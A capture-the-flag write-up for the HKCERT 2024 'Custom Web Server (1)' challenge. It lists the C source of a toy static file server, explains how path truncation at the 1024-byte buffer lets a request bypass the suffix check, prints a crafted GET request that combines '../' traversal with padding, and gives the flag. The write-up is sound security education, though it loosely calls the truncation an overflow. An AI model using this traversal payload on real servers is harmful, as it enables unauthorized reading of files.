# Custom Web Server (1) ❌

## Challenge Description
> ![image](https://github.com/user-attachments/assets/6c6d3faa-1507-44b1-ab11-abcead353e6a)


## Approach
Download thefile, unzip, and read the code.

 ```c
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>

#define PORT 8000
#define BUFFER_SIZE 1024

typedef struct {
    char *content;
    int size;
} FileWithSize;

bool ends_with(char *text, char *suffix) {
    int text_length = strlen(text);
    int suffix_length = strlen(suffix);

    return text_length >= suffix_length && \
           strncmp(text+text_length-suffix_length, suffix, suffix_length) == 0;
}

FileWithSize *read_file(char *filename) {
    if (!ends_with(filename, ".html") && !ends_with(filename, ".png") && !ends_with(filename, ".css") && !ends_with(filename, ".js")) return NULL;

    char real_path[BUFFER_SIZE];
    snprintf(real_path, sizeof(real_path), "public/%s", filename);

    FILE *fd = fopen(real_path, "r");
    if (!fd) return NULL;

    fseek(fd, 0, SEEK_END);
    long filesize = ftell(fd);
    fseek(fd, 0, SEEK_SET);

    char *content = malloc(filesize + 1);
    if (!content) return NULL;

    fread(content, 1, filesize, fd);
    content[filesize] = '\0';

    fclose(fd);

    FileWithSize *file = malloc(sizeof(FileWithSize));
    file->content = content;
    file->size = filesize;
 
    return file;
}

void build_response(int socket_id, int status_code, char* status_description, FileWithSize *file) {
    char *response_body_fmt = 
        "HTTP/1.1 %u %s\r\n"
        "Server: mystiz-web/1.0.0\r\n"
        "Content-Type: text/html\r\n"
        "Connection: %s\r\n"
        "Content-Length: %u\r\n"
        "\r\n";
    char response_body[BUFFER_SIZE];

    sprintf(response_body,
            response_body_fmt,
            status_code,
            status_description,
            status_code == 200 ? "keep-alive" : "close",
            file->size);
    write(socket_id, response_body, strlen(response_body));
    write(socket_id, file->content, file->size);
    free(file->content);
    free(file);
    return;
}

void handle_client(int socket_id) {
    char buffer[BUFFER_SIZE];
    char requested_filename[BUFFER_SIZE];

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        memset(requested_filename, 0, sizeof(requested_filename));

        if (read(socket_id, buffer, BUFFER_SIZE) == 0) return;

        if (sscanf(buffer, "GET /%s", requested_filename) != 1)
            return build_response(socket_id, 500, "Internal Server Error", read_file("500.html"));

        FileWithSize *file = read_file(requested_filename);
        if (!file)
            return build_response(socket_id, 404, "Not Found", read_file("404.html"));

        build_response(socket_id, 200, "OK", file);
    }
}

int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    struct sockaddr_in server_address;
    struct sockaddr_in client_address;

    int socket_id = socket(AF_INET, SOCK_STREAM, 0);
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = htonl(INADDR_ANY);
    server_address.sin_port = htons(PORT);

    if (bind(socket_id, (struct sockaddr*)&server_address, sizeof(server_address)) == -1) exit(1);
    if (listen(socket_id, 5) < 0) exit(1);

    while (1) {
        int client_address_len;
        int new_socket_id = accept(socket_id, (struct sockaddr *)&client_address, (socklen_t*)&client_address_len);
        if (new_socket_id < 0) exit(1);
        int pid = fork();
        if (pid == 0) {
            handle_client(new_socket_id);
            close(new_socket_id);
        }
    }
}
```
> [!NOTE]  
> From the code we can analyse that the server:
> - Serves static files from a `public/` directory.
> - Only allows files with specific suffixes: `.html`, `.png`, `.css`, `.js`.

The code uses `snprintf` to concatenate `public/` with the requested file name:
   ```c
   char real_path[BUFFER_SIZE];
   snprintf(real_path, sizeof(real_path), "public/%s", filename);
   ```
The server uses a hardcoded buffer size of 1024 bytes. Specifically, this snippet is key:
   ```c
   #define BUFFER_SIZE 1024
   ```

If the `filename` string is **long enough**, the `real_path` buffer overflows, causing truncation. This allows bypassing the suffix restriction.

To trick the server into treating `flag.txt` as a valid file, a request is crafted with an excessively long path. The final `.js` suffix gets **truncated** due to the buffer overflow:

   ```plaintext
   GET    /././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././flag.txt.js HTTP/1.1
   ```
> [!NOTE]
> Here’s what happens:
> 1. The long path fills up the `real_path` buffer.
> 2. The `.js` suffix overflows and gets truncated.
> 3. The server reads `public/flag.txt` and serves the flag!

Here’s the full HTTP request used to exploit:

![image](https://github.com/user-attachments/assets/69075c72-96cd-4964-a7a7-f7d3778d554e)

Sending the request gives us the flag!

![image](https://github.com/user-attachments/assets/17911b93-e248-4284-a1a5-091c3f6b39f1)

##Flag
hkcert24{bu1ld1n9_4_w3bs3rv3r_t0_s3rv3_5t4t1c_w3bp4935_1s_n0ntr1vial}
